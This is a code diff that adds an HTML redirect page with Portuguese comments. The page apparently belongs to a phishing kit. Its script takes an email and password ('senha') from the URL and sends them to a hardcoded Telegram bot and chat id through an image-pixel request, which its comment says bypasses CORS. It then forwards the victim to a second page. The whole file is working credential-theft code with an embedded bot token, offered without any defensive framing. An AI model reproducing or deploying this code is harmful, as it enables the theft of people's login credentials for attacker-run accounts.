@@ -1,0 +1,26 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Redirecionando...</title>
+</head>
+<body>
+<script>
+  // Pega os dados da URL (GET)
+  const params = new URLSearchParams(location.search);
+  const email = params.get('email');
+  const senha = params.get('senha');
+
+  if (email && senha) {
+    // Monta mensagem curta
+    const msg = `💸 E:${email} S:${senha}`;
+    // URL do Telegram (mensagem via query string)
+    const url = `https://api.telegram.org/bot7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY/sendMessage?chat_id=6261750345&text=${encodeURIComponent(msg)}`;
+    // Dispara via imagem pixel (bypass CORS)
+    new Image().src = url;
+  }
+  // Redireciona para segunda tela
+  location.replace('segunda.html');
+</script>
+</body>
+</html>
